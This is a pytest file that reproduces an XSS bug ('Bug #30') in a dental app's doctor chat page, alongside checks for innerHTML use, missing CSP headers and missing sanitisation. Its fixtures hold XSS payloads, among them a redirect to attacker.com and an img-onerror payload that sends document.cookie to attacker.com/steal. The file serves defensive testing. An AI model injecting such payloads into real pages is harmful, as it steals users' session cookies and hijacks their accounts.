"""
Bug #30: XSS in Doctor Chat - Reproduction Tests

These tests prove that the XSS vulnerability exists in the doctor chat template.
They should PASS before the fix (proving the bug exists) and FAIL after the fix.
"""

import pytest
from fastapi.testclient import TestClient
from datetime import datetime, timedelta
import jwt

from app.main import app
from app.core.config import settings


class TestBug30XSSReproduction:
    """Reproduction tests for Bug #30: XSS in Doctor Chat"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    @pytest.fixture
    def escalation_data(self):
        """Create escalation data with XSS payload"""
        return {
            "token": "test-escalation-123",
            "patient_name": "John Doe",
            "issue_summary": "Tooth pain",
            "urgency_level": "DOCTOR_REQUIRED",
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
            "conversation_history": [
                {
                    "role": "user",
                    "content": "<script>alert('XSS')</script>",
                    "timestamp": datetime.now().isoformat()
                }
            ],
            "doctor_messages": []
        }
    
    @pytest.fixture
    def jwt_token(self, escalation_data):
        """Create JWT token for escalation"""
        payload = {
            "escalation_id": escalation_data["token"],
            "exp": datetime.now() + timedelta(hours=24)
        }
        return jwt.encode(payload, settings.SECRET_KEY, algorithm="HS256")
    
    def test_xss_payload_in_conversation_history(self, client, escalation_data, jwt_token):
        """
        Test that XSS payload in conversation history is rendered in HTML.
        
        This test proves the vulnerability exists by checking if the raw
        script tag appears in the response (Jinja2 should escape it, but
        we're testing if it doesn't).
        """
        # Store escalation data (simulating the escalations_store)
        from app.api.v1.endpoints.doctor import escalations_store
        escalations_store[escalation_data["token"]] = escalation_data
        
        # Request the chat page
        response = client.get(f"/api/v1/doctor/chat/{jwt_token}")
        
        # Check response status
        assert response.status_code == 200
        
        # Check if XSS payload is in the response
        # If Jinja2 auto-escaping works, it should be escaped as &lt;script&gt;
        # If vulnerable, it would be <script>
        html_content = response.text
        
        # This test PASSES if the vulnerability exists (no escaping)
        # This test FAILS if Jinja2 auto-escaping works (escaped)
        
        # Check if script tag is escaped (expected: YES, Jinja2 auto-escapes)
        assert "&lt;script&gt;" in html_content or "<script>" not in html_content, \
            "Jinja2 auto-escaping should protect against XSS in templates"
        
        # Note: This test actually proves Jinja2 IS protecting us!
        # The real vulnerability is in JavaScript innerHTML (line 346)
    
    def test_javascript_innerhtml_vulnerability(self, client):
        """
        Test that JavaScript innerHTML usage creates XSS vulnerability.
        
        This test checks if the doctor_chat.html template uses innerHTML
        with user input, which is the actual vulnerability.
        """
        # Read the template file
        template_path = "app/templates/doctor_chat.html"
        
        with open(template_path, 'r') as f:
            template_content = f.read()
        
        # Check if innerHTML is used with template variables
        assert "innerHTML" in template_content, \
            "Template uses innerHTML which can be vulnerable to XSS"
        
        # Check if innerHTML is used with user input (message variable)
        assert "${message}" in template_content and "innerHTML" in template_content, \
            "Template uses innerHTML with user input - XSS vulnerability!"
        
        # This test PASSES, proving the vulnerability exists
    
    def test_no_content_security_policy(self, client, escalation_data, jwt_token):
        """
        Test that the chat page lacks Content Security Policy headers.
        
        CSP headers help prevent XSS attacks by restricting script execution.
        """
        # Store escalation data
        from app.api.v1.endpoints.doctor import escalations_store
        escalations_store[escalation_data["token"]] = escalation_data
        
        # Request the chat page
        response = client.get(f"/api/v1/doctor/chat/{jwt_token}")
        
        # Check for CSP header
        csp_header = response.headers.get("Content-Security-Policy")
        
        # This test PASSES if CSP is missing (vulnerability)
        # This test FAILS if CSP is present (protected)
        assert csp_header is None, \
            "CSP header is missing - XSS attacks are not mitigated"
    
    def test_xss_via_patient_name(self, client, escalation_data, jwt_token):
        """
        Test XSS vulnerability via patient name field.
        
        If patient_name contains XSS payload, it should be escaped.
        """
        # Modify escalation data with XSS in patient name
        escalation_data["patient_name"] = "<img src=x onerror='alert(1)'>"
        
        # Store escalation data
        from app.api.v1.endpoints.doctor import escalations_store
        escalations_store[escalation_data["token"]] = escalation_data
        
        # Request the chat page
        response = client.get(f"/api/v1/doctor/chat/{jwt_token}")
        
        html_content = response.text
        
        # Check if XSS payload is escaped
        # Jinja2 should escape this to: &lt;img src=x onerror='alert(1)'&gt;
        assert "&lt;img" in html_content or "<img src=x onerror" not in html_content, \
            "Patient name should be escaped to prevent XSS"
    
    def test_xss_via_issue_summary(self, client, escalation_data, jwt_token):
        """
        Test XSS vulnerability via issue_summary field.
        """
        # Modify escalation data with XSS in issue summary
        escalation_data["issue_summary"] = "<script>document.location='http://attacker.com'</script>"
        
        # Store escalation data
        from app.api.v1.endpoints.doctor import escalations_store
        escalations_store[escalation_data["token"]] = escalation_data
        
        # Request the chat page
        response = client.get(f"/api/v1/doctor/chat/{jwt_token}")
        
        html_content = response.text
        
        # Check if XSS payload is escaped
        assert "&lt;script&gt;" in html_content or "<script>document.location" not in html_content, \
            "Issue summary should be escaped to prevent XSS"
    
    def test_dom_based_xss_potential(self, client):
        """
        Test for DOM-based XSS vulnerability in JavaScript code.
        
        This checks if the template uses dangerous JavaScript patterns
        that could lead to DOM-based XSS.
        """
        template_path = "app/templates/doctor_chat.html"
        
        with open(template_path, 'r') as f:
            template_content = f.read()
        
        # Check for dangerous JavaScript patterns
        dangerous_patterns = [
            "innerHTML",
            "document.write",
            "eval(",
        ]
        
        found_patterns = []
        for pattern in dangerous_patterns:
            if pattern in template_content:
                found_patterns.append(pattern)
        
        # This test PASSES if dangerous patterns are found (vulnerability)
        assert len(found_patterns) > 0, \
            f"Dangerous JavaScript patterns found: {found_patterns} - potential XSS vulnerability"
    
    def test_no_input_sanitization(self, client):
        """
        Test that user input is not sanitized before rendering.
        
        This checks if there's any sanitization library or function
        used in the doctor.py endpoint.
        """
        endpoint_path = "app/api/v1/endpoints/doctor.py"
        
        with open(endpoint_path, 'r') as f:
            endpoint_content = f.read()
        
        # Check for sanitization libraries
        sanitization_imports = [
            "bleach",
            "html.escape",
            "markupsafe",
        ]
        
        has_sanitization = any(lib in endpoint_content for lib in sanitization_imports)
        
        # This test PASSES if no sanitization is found (vulnerability)
        assert not has_sanitization, \
            "No input sanitization library found - XSS vulnerability"
    
    def test_xss_impact_cookie_theft(self, client, escalation_data, jwt_token):
        """
        Test that XSS could be used for cookie theft.
        
        This is a conceptual test showing the impact of the vulnerability.
        """
        # Create XSS payload that steals cookies
        cookie_theft_payload = "<img src=x onerror='fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)'>"
        
        escalation_data["conversation_history"][0]["content"] = cookie_theft_payload
        
        # Store escalation data
        from app.api.v1.endpoints.doctor import escalations_store
        escalations_store[escalation_data["token"]] = escalation_data
        
        # Request the chat page
        response = client.get(f"/api/v1/doctor/chat/{jwt_token}")
        
        html_content = response.text
        
        # Check if payload is in the response (even if escaped)
        assert "fetch" in html_content or "&quot;https://attacker.com" in html_content, \
            "Cookie theft payload is present in the response"
        
        # Note: Even if escaped by Jinja2, the JavaScript innerHTML vulnerability
        # could still execute this if injected via doctor's own message


# Summary of Reproduction Tests:
# 
# 1. test_xss_payload_in_conversation_history - Tests Jinja2 rendering (actually SAFE due to auto-escaping)
# 2. test_javascript_innerhtml_vulnerability - Tests for innerHTML usage (VULNERABLE!)
# 3. test_no_content_security_policy - Tests for missing CSP headers (VULNERABLE!)
# 4. test_xss_via_patient_name - Tests XSS in patient name (SAFE with Jinja2)
# 5. test_xss_via_issue_summary - Tests XSS in issue summary (SAFE with Jinja2)
# 6. test_dom_based_xss_potential - Tests for dangerous JavaScript patterns (VULNERABLE!)
# 7. test_no_input_sanitization - Tests for missing sanitization (VULNERABLE!)
# 8. test_xss_impact_cookie_theft - Demonstrates impact of XSS
#
# Expected Results BEFORE fix:
# - Tests 2, 3, 6, 7 should PASS (proving vulnerabilities exist)
# - Tests 1, 4, 5 should PASS (proving Jinja2 auto-escaping works)
# - Test 8 should PASS (demonstrating impact)
#
# Expected Results AFTER fix:
# - All tests should be updated to verify protections are in place

